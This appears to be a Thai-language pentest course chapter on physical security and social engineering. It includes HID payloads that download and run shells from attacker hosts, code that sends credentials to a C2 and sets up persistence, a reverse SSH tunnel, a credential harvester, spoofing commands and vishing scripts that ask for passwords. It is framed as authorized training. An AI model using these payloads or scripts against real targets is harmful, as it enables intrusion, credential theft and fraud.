# Part 60: Physical Security และ Social Engineering

## สารบัญ
1. [Physical Security Overview](#physical-security-overview)
2. [Lock Picking และ Physical Bypass](#lock-picking)
3. [Social Engineering Techniques](#social-engineering)
4. [Phishing Campaigns](#phishing-campaigns)
5. [Pretexting และ Impersonation](#pretexting)
6. [USB Drop Attacks](#usb-drop-attacks)
7. [Wireless Physical Attacks](#wireless-physical-attacks)
8. [Physical Penetration Testing](#physical-pentest)
9. [OSINT for Physical Recon](#osint-physical)
10. [Countermeasures และ Defense](#countermeasures)

---

## 1. Physical Security Overview {#physical-security-overview}

การทดสอบความปลอดภัยทางกายภาพ (Physical Penetration Testing) เป็นส่วนสำคัญของการประเมินความปลอดภัยแบบครบวงจร เนื่องจากการโจมตีหลายรูปแบบเริ่มต้นจากการเข้าถึงทางกายภาพ

### Physical Attack Vectors

```
Physical Security Attack Surface:

┌─────────────────────────────────────────────────────────────┐
│                    PHYSICAL THREATS                         │
├─────────────────┬───────────────────┬───────────────────────┤
│   Entry Points  │   Device Attacks  │   Social Engineering  │
├─────────────────┼───────────────────┼───────────────────────┤
│ • Lock picking  │ • USB drops       │ • Phishing           │
│ • Tailgating    │ • HID attacks     │ • Pretexting         │
│ • RFID cloning  │ • Hardware keylog │ • Vishing            │
│ • Door bypass   │ • Cold boot       │ • Impersonation      │
│ • Fence/wall    │ • Rubber ducky    │ • Quid pro quo       │
└─────────────────┴───────────────────┴───────────────────────┘
```

### กฎหมายและจริยธรรม

```bash
# CRITICAL: Physical testing ต้องมีเอกสารอนุญาตเสมอ
# Get Out of Jail Free Card - ต้องพกติดตัว

# เอกสารที่ต้องมี:
# 1. Written Authorization Letter
# 2. Scope of Work document
# 3. Emergency contact numbers
# 4. Rules of Engagement

# ตัวอย่าง Authorization Letter elements:
cat << 'EOF'
PHYSICAL PENETRATION TEST AUTHORIZATION

This letter authorizes [Tester Name/Company] to perform
physical security testing at [Client Location] from
[Start Date] to [End Date].

Scope: Buildings A, B, and parking facilities
Exclusions: Data centers, executive floor

Emergency Contact: [Name] - [Phone]

Signed: [Authorized Executive]
Date: [Date]
EOF
```

---

## 2. Lock Picking และ Physical Bypass {#lock-picking}

### Lock Picking Basics

```
Pin Tumbler Lock Anatomy:

    Driver Pin (Top)
    ─────────────
    Key Pin (Bottom)
    ─────────────
    Plug (Rotates when all pins at shear line)

Picking Process:
1. Apply rotational tension with tension wrench
2. Push pins up one at a time with pick
3. Set each pin at the shear line
4. When all pins set → plug rotates
```

### Lock Bypass Tools

```bash
# เครื่องมือที่ใช้ใน Physical Pentest:

# 1. Lock Picks
Single Pin Picking (SPP) - เลือก pin ทีละอัน
Raking - ใช้ rake pick แบบรวดเร็ว
Bump Key - ใช้ key พิเศษ + แรงกระแทก

# 2. Bypass Tools
Loider/Shim - สำหรับ door latches
Under Door Tool - ดึง door handle จากข้างนอก
Camera Flex Cable - ดูผ่านช่องประตู

# 3. RFID/Access Card Tools
Proxmark3 - อ่านและโคลน RFID cards
ChameleonMini - Emulate RFID cards
ACR122U - อ่าน NFC cards
```

### RFID Cloning

```bash
# ติดตั้ง Proxmark3 tools
apt install proxmark3

# อ่าน HID Prox card
proxmark3 /dev/ttyACM0
pm3> lf hid read

# Output:
# #db# FeliCa card found
# Raw: 2006ec0c86
# Decoded: Card: 12345 FAC: 100

# โคลน card ไปยัง T5577 blank card
pm3> lf hid clone --r 2006ec0c86

# อ่าน Mifare Classic (ประตู/ลิฟต์ระบบใหม่)
pm3> hf mf autopwn

# Sniff RFID traffic
pm3> lf sniff
pm3> lf search

# NFC ด้วย ACR122U
nfc-list  # แสดง cards ที่อยู่ใกล้
nfc-mfclassic r a u dump.mfd  # อ่าน Mifare
```

### Tailgating และ Door Bypass

```bash
# การวิเคราะห์ระบบประตูก่อนเข้า:

# 1. สังเกต timing ของประตู (กี่วินาทีก่อนปิด)
# 2. มี mantrap หรือไม่
# 3. มีกล้อง CCTV ตรงไหนบ้าง
# 4. พนักงานรักษาความปลอดภัยอยู่ตรงไหน
# 5. บัตรประเภทใด (HID, Mifare, etc.)

# Tailgating techniques:
# - รอพนักงานเข้าแล้วเดินตาม
# - ถือของมาก ทำท่าเหมือนมือเต็ม
# - แต่งตัวเหมือน delivery/maintenance

# Under Door Tool (UDT) สำหรับ lever handles:
# 1. สอดสาย camera ใต้ประตู
# 2. สอด UDT hook เข้าไป
# 3. คล้อง door handle แล้วดึง
```

---

## 3. Social Engineering Techniques {#social-engineering}

### Social Engineering Framework

```python
#!/usr/bin/env python3
# social_eng_framework.py - Framework สำหรับวางแผน SE

class SocialEngineeringAttack:
    def __init__(self, target_org, objective):
        self.target = target_org
        self.objective = objective
        self.pretext = None
        self.attack_vector = None
        self.success_indicators = []
    
    def recon_phase(self):
        """รวบรวมข้อมูลเป้าหมาย"""
        recon_checklist = {
            'org_info': [
                'Company website / About page',
                'LinkedIn company profile',
                'Job postings (reveals tech stack)',
                'Press releases',
                'Annual reports'
            ],
            'employee_info': [
                'LinkedIn employees',
                'Email format (first.last@company.com)',
                'Org chart / reporting structure',
                'Recent departures/new hires',
                'Social media profiles'
            ],
            'technical_info': [
                'Email server (MX records)',
                'Web technologies (Wappalyzer)',
                'Phone system (VoIP?)',
                'Help desk procedures',
                'Vendor relationships'
            ]
        }
        return recon_checklist
    
    def build_pretext(self, scenario):
        """สร้าง pretext สำหรับการโจมตี"""
        pretexts = {
            'it_support': {
                'role': 'IT Support Technician',
                'reason': 'กำลัง upgrade ระบบ / ตรวจสอบปัญหา',
                'ask': 'ขอ verify credentials',
                'urgency': 'ระบบจะ maintenance คืนนี้'
            },
            'vendor': {
                'role': 'Software Vendor Representative',
                'reason': 'มาติดตั้ง/อัพเดตซอฟต์แวร์',
                'ask': 'ขอเข้าถึงห้อง server',
                'urgency': 'Contract renewal deadline'
            },
            'executive': {
                 'role': 'New Executive (CFO/CTO)',
                'reason': 'ยังไม่มี access ครบ',
                'ask': 'ขอให้ช่วยส่งข้อมูลด่วน',
                'urgency': 'Board meeting ในอีก 1 ชั่วโมง'
            },
            'auditor': {
                'role': 'External Auditor',
                'reason': 'Annual security audit',
                'ask': 'ขอดูเอกสาร/ระบบ',
                'urgency': 'Compliance deadline'
            }
        }
        self.pretext = pretexts.get(scenario, {})
        return self.pretext
    
    def psychological_principles(self):
        """Cialdini's principles of influence"""
        return {
            'authority': 'อ้างตัวเป็นผู้มีอำนาจ (IT manager, CEO)',
            'urgency': 'สร้างความกดดันเวลา (deadline, emergency)',
            'social_proof': 'อ้างว่าคนอื่นก็ทำแบบนี้',
            'liking': 'สร้างความสัมพันธ์ก่อน',
            'reciprocity': 'ให้บางอย่างก่อน แล้วค่อยขอ',
            'scarcity': 'โอกาสนี้มีแค่ครั้งเดียว',
            'commitment': 'ขอความมุ่งมั่นเล็กๆ ก่อน'
        }

# สร้าง attack plan
attack = SocialEngineeringAttack('AcmeCorp', 'credential_harvest')
recon = attack.recon_phase()
pretext = attack.build_pretext('it_support')
principles = attack.psychological_principles()

print("Attack Plan:")
print(f"Target: {attack.target}")
print(f"Pretext: {pretext}")
```

### Vishing (Voice Phishing)

```bash
# Vishing Setup ด้วย Asterisk (สำหรับ authorized testing)

# ติดตั้ง Asterisk
apt install asterisk

# Caller ID Spoofing - เพื่อแสดงหมายเลขที่ต้องการ
# NOTE: ต้องมี authorization และทำในบริบทที่ถูกกฎหมาย

# SIP config สำหรับ test environment
cat /etc/asterisk/sip.conf
# [general]
# context=default
# allowoverlap=no
# udpbindaddr=0.0.0.0
# tcpenable=no
# transport=udp

# Script สำหรับ Vishing
cat << 'SCRIPT'
Vishing Call Script - IT Support Scenario

"สวัสดีครับ/ค่ะ ผม/หนูชื่อ [ชื่อ] จาก IT Department ครับ/ค่ะ
 พูดกับ [ชื่อเป้าหมาย] ได้ไหมครับ/ค่ะ?"

[รอ confirm]

"ครับ/ค่ะ ขอโทษที่รบกวนนะครับ/ค่ะ ตอนนี้ระบบของเรากำลัง
migrate ไป cloud ใหม่ครับ/ค่ะ ขอ verify account ของคุณ
สักครู่ได้ไหมครับ/ค่ะ? เพื่อให้ไม่กระทบ access ของคุณ"

[ถ้าถาม ID]
"ผม/หนู [Name] จาก IT ext. [Number] ครับ/ค่ะ คุณสามารถ
โทรกลับมาได้เลยครับ/ค่ะ" [ให้เบอร์ที่คุณควบคุมได้]

[ขั้นตอนต่อไป]
"ขอ confirm username ของคุณได้ไหมครับ/ค่ะ?"
"แล้วก็ขอ verify password ด้วยครับ/ค่ะ เพื่อ confirm account"
SCRIPT
```

---

## 4. Phishing Campaigns {#phishing-campaigns}

### GoPhish - Phishing Framework

```bash
# ดาวน์โหลดและติดตั้ง GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish

# รัน GoPhish server
./gophish
# Admin UI: https://localhost:3333
# Default: admin / gophish

# GoPhish config.json
cat config.json
{
    "admin_server": {
        "listen_url": "0.0.0.0:3333",
        "use_tls": true,
        "cert_path": "gophish_admin.crt",
        "key_path": "gophish_admin.key"
    },
    "phish_server": {
        "listen_url": "0.0.0.0:80",
        "use_tls": false
    },
    "db_name": "sqlite3",
    "db_path": "gophish.db"
}
```

### Phishing Page Cloning

```bash
# Clone website ด้วย wget
wget --mirror --convert-links --page-requisites --no-parent \
     -P phish_pages/ https://target-login-page.com

# HTTrack - website cloner
apt install httrack
httrack https://target-site.com -O ./cloned_site

# setoolkit (Social Engineering Toolkit)
setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner
# Enter URL to clone: https://target.com

# ปรับแต่ง phishing page
# แก้ไข form action ให้ส่งข้อมูลมาที่เรา
cat << 'HTML'
<!-- แก้ไข form ใน cloned page -->
<form action="https://our-collector.com/harvest" method="POST">
    <input type="hidden" name="redirect" value="https://legitimate-site.com">
    <!-- original form fields -->
</form>
HTML
```

### Credential Harvester

```python
#!/usr/bin/env python3
# credential_harvester.py - รับ credentials จาก phishing page

from flask import Flask, request, redirect
import logging
import json
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(filename='harvested.log', level=logging.INFO)

@app.route('/harvest', methods=['POST'])
def harvest():
    data = request.form.to_dict()
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    timestamp = datetime.now().isoformat()
    
    # บันทึก credentials
    entry = {
        'timestamp': timestamp,
        'ip': ip,
        'user_agent': ua,
        'data': data
    }
    
    logging.info(json.dumps(entry))
    print(f"[+] Captured: {data}")
    
    # Redirect ไป legitimate site เพื่อไม่ให้สงสัย
    redirect_url = data.get('redirect', 'https://google.com')
    return redirect(redirect_url)

@app.route('/results')
def results():
    # ดูผลลัพธ์ (ต้องมี auth ในระบบจริง)
    try:
        with open('harvested.log', 'r') as f:
            return f'<pre>{f.read()}</pre>'
    except:
        return 'No data yet'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

### Email Spoofing

```bash
# ตรวจสอบ SPF/DKIM/DMARC ของเป้าหมาย
dig TXT targetcompany.com | grep -E 'spf|dkim|dmarc'
nslookup -type=TXT _dmarc.targetcompany.com

# ถ้าไม่มี DMARC หรือ policy=none → spoofing อาจสำเร็จ
# ถ้า policy=reject → ต้องใช้ lookalike domain แทน

# Lookalike domain techniques:
# targetcompany.com  →  targetc0mpany.com
# targetcompany.com  →  target-company.com
# targetcompany.com  →  targetcompany-it.com
# targetcompany.com  →  argetcompany.com (typosquat)

# ซื้อ domain ที่ดูคล้ายและตั้ง email server

# Swaks - SMTP test tool
swaks --to victim@targetcompany.com \
      --from ceo@targetcompany.com \
      --server mail.targetcompany.com \
      --header "Subject: Urgent Action Required" \
      --body "Please reset your password immediately"

# เพิ่ม attachment
swaks --to victim@target.com \
      --from helpdesk@target.com \
      --attach malicious.pdf \
      --header "Subject: Q4 Security Report"
```

---

## 5. Pretexting และ Impersonation {#pretexting}

### Impersonation Props

```bash
# เครื่องมือที่ใช้ในการ impersonate:

# 1. Fake ID / Badge
# - ใช้ Canva หรือ Adobe เพื่อสร้าง badge
# - Print บน PVC card
# - ใช้ lanyard สีเดียวกับ target org

# 2. Uniform / Appearance
# - Delivery person: uniform + package + clipboard
# - IT technician: polo shirt + laptop bag + tools
# - Vendor: business casual + briefcase

# 3. Props
# - Clipboard with forms
# - Laptop/tablet
# - Fake work order
# - Business cards

# Scenario Script: Fake IT Support
cat << 'SCRIPT'
=== Scenario: Emergency IT Support ===

แต่งตัว: Polo shirt + ID badge + laptop bag
เวลา: ช่วงเช้าหรือหลังอาหารกลางวัน (คนยุ่ง)

เข้าประตู:
"สวัสดีครับ ผมมาจาก IT Department มีงาน emergency
network issue ที่ floor นี้ครับ ขอเข้าไปตรวจสอบได้เลยไหมครับ?"

ในออฟฟิศ:
"ขอโทษนะครับ คอมของคุณอยู่ใกล้ network switch ไหมครับ?
มีปัญหาที่ switch ครับ ขอดู cable สักครู่นะครับ"

ขณะ "ซ่อม" → ติด USB keylogger หรือ implant device
SCRIPT
```

### Pretext Phone Call Framework

```python
#!/usr/bin/env python3
# pretext_planner.py

def create_help_desk_pretext():
    """สร้าง script สำหรับ Help Desk impersonation"""
    
    script = {
        'opening': {
            'th': "สวัสดีครับ ผมชื่อ [ชื่อ] จาก IT Help Desk ครับ",
            'reason': "มีการแจ้งปัญหา login จากบัญชีของคุณครับ"
        },
        'build_rapport': {
            'questions': [
                "ตอนนี้คุณอยู่ที่ออฟฟิศหรืองาน remote ครับ?",
                "คุณใช้ Windows หรือ Mac ครับ?"
            ]
        },
        'create_urgency': {
            'message': "เราตรวจพบการ login ผิดปกติจาก IP ต่างประเทศครับ"
                       "ต้องรีบ lock account เพื่อความปลอดภัยครับ"
        },
        'extract_info': {
            'steps': [
                "ขอ verify ตัวตนด้วย employee ID ได้ไหมครับ?",
                "ขอ confirm username ที่ใช้ login ได้ไหมครับ?",
                "เพื่อ reset password ขอ current password ด้วยนะครับ"
            ]
        },
        'closing': {
            'message': "ขอบคุณครับ ผม update ticket แล้วนะครับ"
                       "ถ้ามีปัญหาอะไรโทรหาผมได้เลยที่ ext. [number] ครับ"
        }
    }
    return script

def analyze_target_psychology(target_info):
    """วิเคราะห์จุดอ่อนทางจิตวิทยา"""
    vulnerabilities = []
    
    if target_info.get('new_employee'):
        vulnerabilities.append('ไม่คุ้นเคยกับ procedures')
    if target_info.get('busy_season'):
        vulnerabilities.append('มีงานมาก ตัดสินใจเร็ว')
    if target_info.get('recent_announcement'):
        vulnerabilities.append('มี context ที่น่าเชื่อถือ')
    
    return vulnerabilities
```

---

## 6. USB Drop Attacks {#usb-drop-attacks}

### USB Rubber Ducky

```bash
# USB Rubber Ducky - HID Attack Device
# มีหน้าตาเหมือน USB flash drive แต่จำลองตัวเองเป็น keyboard

# Ducky Script - Windows reverse shell
cat payloads/windows_reverse_shell.txt
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "
INVoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
ENTER

# Ducky Script - macOS
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000
STRING curl -s http://attacker.com/shell.sh | bash
ENTER

# แปลง Ducky Script เป็น inject.bin
java -jar encoder.jar -i payload.txt -o inject.bin -l us

# O.MG Cable - Malicious USB cable
# ดูเหมือน cable ปกติ แต่มี microcontroller ข้างใน
# รองรับ WiFi สำหรับ remote access
```

### Custom BadUSB

```python
#!/usr/bin/env python3
# badusb_payload_generator.py - สร้าง HID payloads

class DuckyScriptGenerator:
    def __init__(self, target_os='windows'):
        self.os = target_os
        self.payload = []
    
    def add_delay(self, ms=500):
        self.payload.append(f"DELAY {ms}")
    
    def type_string(self, text):
        self.payload.append(f"STRING {text}")
    
    def press_key(self, key):
        self.payload.append(key.upper())
    
    def windows_run(self, command):
        """รัน command ผ่าน Windows Run dialog"""
        self.payload.extend([
            "DELAY 1000",
            "GUI r",
            "DELAY 500",
            f"STRING {command}",
            "ENTER"
        ])
    
    def windows_powershell_hidden(self, ps_command):
        """รัน PowerShell แบบซ่อน"""
        cmd = f'powershell -WindowStyle Hidden -EncodedCommand {self._encode_ps(ps_command)}'
        self.windows_run(cmd)
    
    def _encode_ps(self, command):
        import base64
        encoded = base64.b64encode(command.encode('utf-16-le')).decode()
        return encoded
    
    def exfil_credentials(self, c2_server):
        """ขโมย saved credentials"""
        ps_cmd = f'''
$creds = cmdkey /list
$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($creds))
Invoke-WebRequest -Uri "{c2_server}/collect" -Method POST -Body $data
'''
        self.windows_powershell_hidden(ps_cmd)
    
    def add_persistence(self, payload_url):
        """เพิ่ม persistence"""
        ps_cmd = f'''
$url = "{payload_url}"
$path = "$env:APPDATA\\updater.ps1"
(New-Object Net.WebClient).DownloadFile($url, $path)
$action = New-ScheduledTaskAction -Execute "powershell" -Argument "-File $path"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger -RunLevel Highest
'''
        self.windows_powershell_hidden(ps_cmd)
    
    def generate(self):
        return '\n'.join(self.payload)

# ตัวอย่างการใช้
g = DuckyScriptGenerator('windows')
g.exfil_credentials('http://192.168.1.100:8080')
g.add_persistence('http://192.168.1.100:8080/update.ps1')
print(g.generate())
```

### USB Drop Strategy

```bash
# กลยุทธ์การ drop USB

# 1. Location scouting
locations=(
    "parking lot - พนักงานเจอแล้วอยากรู้เนื้อหา"
    "lobby - คนเก็บแล้วเอาเข้าออฟฟิศ"
    "restroom - curious"
    "cafeteria - lunch break"
    "conference room - forgot by visitor"
)

# 2. Labeling สำหรับความน่าเชื่อถือ
labels=(
    "Q4 Salary Review - CONFIDENTIAL"
    "Employee Performance Ratings"
    "Merger Documents - DO NOT DISTRIBUTE"
    "IT Recovery Tools"
    "[Company] Backup 2024"
)

# 3. ตรวจสอบว่า execute เมื่อเสียบ:
# Windows: Autorun ถูก disable โดย default ตั้งแต่ Windows 7
# ต้องใช้ HID attack (Rubber Ducky) แทน

# 4. สร้าง USB ที่ดูน่าเชื่อถือ
# - มีไฟล์ document ปลอม
# - ไฟล์ที่เห็นจะ execute payload จริงๆ
# Windows: .lnk file หรือ .bat ที่ซ่อนไว้

# LNK file ที่รัน PowerShell โดยซ่อน:
# Target: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
# Arguments: -windowstyle hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
# Icon: %SystemRoot%\System32\imageres.dll,3  (folder icon)
```

---

## 7. Wireless Physical Attacks {#wireless-physical-attacks}

### WiFi Pineapple-style Attacks

```bash
# Evil Twin / Rogue AP
# สร้าง Access Point ที่แอบอ้างเป็น corporate WiFi

# ติดตั้ง hostapd
apt install hostapd dnsmasq

# hostapd.conf
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=Corporate-WiFi    # ชื่อเดียวกับของจริง
hw_mode=g
channel=6
wpa=2
wpa_passphrase=Welcome123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
EOF

# dnsmasq สำหรับ DHCP
cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan1
dhcp-range=10.0.0.10,10.0.0.100,12h
address=/#/10.0.0.1
EOF

# Captive portal สำหรับ credential harvest
# เมื่อ user เชื่อมต่อ → redirect ไป login page ปลอม

# เริ่ม services
hostapd /tmp/hostapd.conf &
dnsmasq -C /tmp/dnsmasq.conf

# ตั้ง IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Redirect HTTP ไป captive portal
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 \
         -j REDIRECT --to-port 8080

# รัน captive portal (Flask)
python3 captive_portal.py
```

### Bluetooth Attacks

```bash
# BlueTooth reconnaissance
hciconfig hci0 up
hcitool scan  # Classic Bluetooth
hcitool lescan  # BLE

# Bluejacking - ส่ง message ไป device
bluejack 00:11:22:33:44:55

# BlueSnarf - ดึงข้อมูลจาก device เก่า
bluesnarfer -r 1-100 -C 10 -b 00:11:22:33:44:55

# Bluetooth MITM ด้วย btlejack
pip3 install btlejack
btlejack -d /dev/ttyACM0 sniff

# GATTacker - BLE MITM
npm install -g gattacker
gatttool -b 00:11:22:33:44:55 --interactive
> primary  # list services
> characteristics  # list characteristics
> char-read-hnd 0x0003  # read value
```

---

## 8. Physical Penetration Testing {#physical-pentest}

### Physical Pentest Methodology

```
Physical Pentest Phases:

1. Planning & Authorization
   ├── Get written permission
   ├── Define scope (buildings, areas)
   ├── Set Rules of Engagement
   └── Prepare Get Out of Jail card

2. Reconnaissance
   ├── Google Maps / Street View
   ├── OSINT (social media, news)
   ├── Dumpster diving (documents)
   └── Observation / surveillance

3. Execution
   ├── Physical access attempts
   ├── Social engineering
   ├── Device implants
   └── Document findings

4. Reporting
   ├── Timestamped photos/video
   ├── Successful entry methods
   ├── Data/systems accessed
   └── Remediation recommendations
```

### Dumpster Diving

```bash
# Dumpster diving - ค้นหาข้อมูลที่ถูกทิ้ง
# ต้องทำบนที่สาธารณะหรือได้รับอนุญาต

# สิ่งที่มักพบ:
valuable_items=(
    "Employee directories with email/phone"
    "Network diagrams"
    "Old server hardware with data"
    "Printed emails with internal info"
    "Access cards (expired)"
    "IT asset tags"
    "Vendor contracts"
    "Password sticky notes!"
)

# เครื่องมือที่ใช้:
# - ถุงมือ
# - ถุง ziploc สำหรับเก็บตัวอย่าง
# - กล้องถ่ายรูป
# - flashlight

# ข้อมูลที่ได้นำไปใช้:
# 1. Email format → สร้าง phishing email
# 2. Network diagram → map infrastructure
# 3. Employee list → social engineering
# 4. Old credentials → credential stuffing
```

### Hardware Implants

```bash
# Network Tap - passive network monitoring
# Throwing Star LAN Tap - เสียบระหว่าง ethernet cable
# สามารถ monitor traffic โดยไม่ detect

# LAN Turtle - USB network implant
# เสียบที่ USB port → NAT tunnel กลับมาหาเรา
# https://shop.hak5.org/products/lan-turtle

# Packet Squirrel - network monitoring
# inline network device for packet capture

# Screen Crab - HDMI capture
# เสียบระหว่าง HDMI → capture screen

# Key Croc - keylogger
# ดูเหมือน USB dongle → log keystrokes

# ตัวอย่าง LAN Turtle module:
# Auto SSH Tunnel
cat /etc/openvpn/modules/autossh
#!/bin/bash
autossh -M 0 -f -N \
    -o "ServerAliveInterval 30" \
    -o "ServerAliveCountMax 3" \
    -R 0.0.0.0:2222:localhost:22 \
    attacker@c2server.com
```

---

## 9. OSINT for Physical Recon {#osint-physical}

### Location Intelligence

```bash
# Google Maps reconnaissance
# ค้นหา satellite view ของ target building
# ดู street view สำหรับ entrance points
# ดู reviews สำหรับข้อมูลด้านใน

# Shodan - ค้นหา cameras, printers, etc.
shodan search 'city:Bangkok org:"Target Company"'
shodan search 'has_screenshot:true org:"Target"'

# ค้นหา IP range ของ target
whois targetcompany.com | grep -E 'inetnum|CIDR|NetRange'

# LinkedIn recon
# ค้นหาพนักงานที่ทำงาน security/IT
# ดูว่าใช้ tools อะไร, certifications อะไร
# หา org structure

# theHarvester
theHarvester -d targetcompany.com -b linkedin

# Maltego - visual OSINT
# แสดง relationship ระหว่าง entities
# หา email, phone, social media ของ employees

# Shodan สำหรับ physical devices:
shodan search 'product:"Axis" city:"Bangkok"'  # IP cameras
shodan search 'Genetec Security Center'  # access control
shodan search 'product:"Honeywell"'  # building systems
```

### Employee Target Research

```python
#!/usr/bin/env python3
# employee_recon.py - รวบรวมข้อมูลพนักงาน

import requests
from bs4 import BeautifulSoup
import re

class EmployeeRecon:
    def __init__(self, company_domain):
        self.domain = company_domain
        self.employees = []
        self.email_format = None
    
    def get_email_format(self):
        """ค้นหา email format จาก Hunter.io (เฉพาะ free tier)"""
        url = f"https://hunter.io/email-format/{self.domain}"
        # ใช้ API key จริงๆ ต้องสมัคร
        patterns = [
            '{first}.{last}@' + self.domain,
            '{f}{last}@' + self.domain,
            '{first}@' + self.domain,
        ]
        return patterns
    
    def search_linkedin(self, company_name):
        """ค้นหาพนักงานจาก LinkedIn (manual process)"""
        search_queries = [
            f'site:linkedin.com/in "{company_name}" "IT Manager"',
            f'site:linkedin.com/in "{company_name}" "Security"',
            f'site:linkedin.com/in "{company_name}" "System Administrator"',
        ]
        return search_queries
    
    def validate_email(self, email):
        """ตรวจสอบว่า email ยังใช้ได้"""
        import smtplib
        domain = email.split('@')[1]
        
        try:
            mx = self._get_mx(domain)
            if not mx:
                return False
            
            with smtplib.SMTP(mx) as smtp:
                smtp.ehlo()
                smtp.mail('test@test.com')
                code, _ = smtp.rcpt(email)
                return code == 250
        except:
            return False
    
    def _get_mx(self, domain):
        import dns.resolver
        try:
            records = dns.resolver.resolve(domain, 'MX')
            return str(sorted(records, key=lambda r: r.preference)[0].exchange)
        except:
            return None

# การใช้งาน:
recon = EmployeeRecon('targetcompany.com')
formats = recon.get_email_format()
queries = recon.search_linkedin('Target Company')

for q in queries:
    print(f"[*] Search: {q}")
```

---

## 10. Countermeasures และ Defense {#countermeasures}

### Physical Security Controls

```bash
# Defense in Depth สำหรับ Physical Security

# 1. Perimeter Security
cat << 'CONTROLS'
Perimeter Controls:
- Fencing and barriers
- Security lighting
- CCTV cameras (internal + external)
- Security guards
- Vehicle barriers

Building Access:
- Multi-factor authentication (badge + PIN)
- Mantrap / airlock entry
- Visitor management system
- Escort policy
- Background checks
CONTROLS

# 2. Server Room / Data Center
# - Biometric access control
# - Video surveillance inside
# - Environmental monitoring
# - Cabinet locks
# - Asset tracking (RFID)

# 3. Employee Training
training_topics=(
    "Social engineering awareness"
    "Tailgating prevention"
    "Badge discipline (don't lend)"
    "Clean desk policy"
    "How to challenge visitors"
    "Reporting suspicious activity"
)

# 4. Technical Controls
# - USB ports disabled (Group Policy)
# - Autorun disabled
# - Screen lock after 5 min
# - Full disk encryption
# - MDM for mobile devices
```

### Anti-Phishing Training Platform

```python
#!/usr/bin/env python3
# phishing_awareness_tracker.py

from datetime import datetime
import json

class PhishingAwarenessTrainer:
    def __init__(self):
        self.campaigns = []
        self.results = {}
    
    def create_campaign(self, name, targets):
        campaign = {
            'id': len(self.campaigns) + 1,
            'name': name,
            'start_date': datetime.now().isoformat(),
            'targets': targets,
            'clicked': [],
            'submitted_creds': [],
            'reported': []
        }
        self.campaigns.append(campaign)
        return campaign['id']
    
    def track_click(self, campaign_id, email):
        """ติดตาม user ที่คลิก link"""
        for c in self.campaigns:
            if c['id'] == campaign_id:
                if email not in c['clicked']:
                    c['clicked'].append(email)
                    print(f"[ALERT] {email} clicked phishing link!")
                    # ส่ง notification ไป security team
    
    def track_submission(self, campaign_id, email):
        """ติดตาม user ที่กรอก credentials"""
        for c in self.campaigns:
            if c['id'] == campaign_id:
                if email not in c['submitted_creds']:
                    c['submitted_creds'].append(email)
                    print(f"[CRITICAL] {email} submitted credentials!")
    
    def generate_report(self, campaign_id):
        """สร้าง awareness report"""
        for c in self.campaigns:
            if c['id'] == campaign_id:
                total = len(c['targets'])
                clicked = len(c['clicked'])
                submitted = len(c['submitted_creds'])
                reported = len(c['reported'])
                
                report = {
                    'campaign': c['name'],
                    'total_targets': total,
                    'click_rate': f"{(clicked/total)*100:.1f}%",
                    'submission_rate': f"{(submitted/total)*100:.1f}%",
                    'report_rate': f"{(reported/total)*100:.1f}%",
                    'high_risk_users': c['submitted_creds']
                }
                
                return report
    
    def identify_training_needs(self, campaign_id):
        """ระบุ users ที่ต้องการ training"""
        for c in self.campaigns:
            if c['id'] == campaign_id:
                # Users ที่คลิก → ต้อง training
                need_training = set(c['clicked'])
                # Users ที่ submit → urgent training
                urgent_training = set(c['submitted_creds'])
                
                return {
                    'standard_training': list(need_training - urgent_training),
                    'urgent_training': list(urgent_training),
                    'no_action': [u for u in c['targets'] 
                                 if u not in need_training]
                }

# ตัวอย่าง:
trainer = PhishingAwarenessTrainer()
campaign_id = trainer.create_campaign(
    'Q4 2024 Phishing Test',
    ['employee1@company.com', 'employee2@company.com']
)

# จำลอง events
trainer.track_click(campaign_id, 'employee1@company.com')
trainer.track_submission(campaign_id, 'employee1@company.com')

report = trainer.generate_report(campaign_id)
print(json.dumps(report, indent=2))
```

---

## แบบฝึกหัด

### Lab 1: GoPhish Campaign

```bash
# 1. ติดตั้งและ configure GoPhish
git clone https://github.com/gophish/gophish
cd gophish && go build
./gophish

# 2. สร้าง Sending Profile
# SMTP: localhost:25 (ใช้ test SMTP)

# 3. สร้าง Landing Page
# Clone หน้า login ใดก็ได้
# เพิ่ม Capture Submitted Data

# 4. สร้าง Email Template
# Subject: ด่วน! ต้อง verify account ภายใน 24 ชั่วโมง
# Body: มี link ไปยัง landing page

# 5. Launch Campaign กับ test email ของตัวเอง
# 6. ดู results ใน dashboard
```

### Lab 2: USB HID Attack

```bash
# ใช้ Arduino Leonardo หรือ Digispark (ราคาถูก)
# ตั้งค่าเป็น HID keyboard

# Arduino sketch สำหรับ Windows reverse shell
cat << 'ARDUINO'
#include <Keyboard.h>

void setup() {
  delay(2000);  // รอ OS recognize device
  
  // เปิด Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  delay(500);
  
  // พิมพ์ command
  Keyboard.print("powershell -ep bypass -w hidden");
  Keyboard.press(KEY_RETURN);
  delay(1000);
  Keyboard.releaseAll();
  
  // PowerShell command
  Keyboard.println("IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {}
ARDUINO

